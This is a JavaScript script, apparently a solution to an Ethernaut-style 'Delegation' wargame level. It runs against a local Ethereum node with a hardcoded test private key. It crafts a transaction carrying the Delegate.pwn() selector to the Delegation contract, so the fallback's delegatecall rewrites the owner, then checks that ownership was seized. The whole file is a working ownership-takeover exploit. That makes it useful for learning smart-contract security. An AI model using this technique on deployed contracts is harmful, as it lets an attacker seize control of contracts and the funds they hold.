// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const BigNumber = require('bignumber.js');

const delegate = require('./build/contracts/Delegate.json');
const delegation = require('./build/contracts/Delegation.json');

(async function pwn() {
  // Note that we're not using the deployment keys of the truffle here.
  var privateKey =
    'a3ade3bffea3a3af6c4fdcb7305a3f26a2baff5b97e2f061fadebb9215b6460b';
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();
  const delegateAddress = delegate.networks[networkId].address;
  const delegateContract = new web3.eth.Contract(delegate.abi, delegateAddress);
  const delegationAddress = delegation.networks[networkId].address;
  const delegationContract = new web3.eth.Contract(
    delegation.abi,
    delegationAddress,
  );

  // We check whether or not we're the owner of the delegate contract already.
  // Ideally, we shouldn't be.
  let owner = await delegationContract.methods.owner().call({from: publicKey});
  console.log(
    'Are we the owner of delegation?',
    web3.utils.toChecksumAddress(owner) ===
      web3.utils.toChecksumAddress(publicKey),
  );

  // We generate the function id using encodeABI for Delegate.pwn. It's
  // 0xdd365b8b. See: https://func-id.netlify.com/
  const method = delegateContract.methods.pwn();
  const data = method.encodeABI();
  const gasLimit = method.estimateGas({from: publicKey});

  // We generate a transaction which's data contains the function signature of
  // Delegate.pwn() as data but call Delegation with it. As there is no
  // function pwn() in Delegation, its fallback function will be invoked which
  // we can then abuse to do the delegatecall to Delegate.pwn().
  const count = await web3.eth.getTransactionCount(publicKey);
  const rawTx = {
    from: publicKey,
    to: delegationAddress,
    nonce: web3.utils.toHex(count),
    gasPrice: web3.utils.toHex(web3.utils.toWei('21', 'gwei')),
    gasLimit: web3.utils.toHex(gasLimit),
    data,
  };
  var tx = new Tx(rawTx);
  tx.sign(Buffer.from(privateKey, 'hex'));
  console.log(
    'Pwning contract by calling fallback function and Delegate.pwn()',
  );
  await web3.eth.sendSignedTransaction('0x' + tx.serialize().toString('hex'));

  owner = await delegationContract.methods.owner().call({from: publicKey});
  console.log(
    'Are we the owner of delegation?',
    web3.utils.toChecksumAddress(owner) ===
      web3.utils.toChecksumAddress(publicKey),
  );
})();
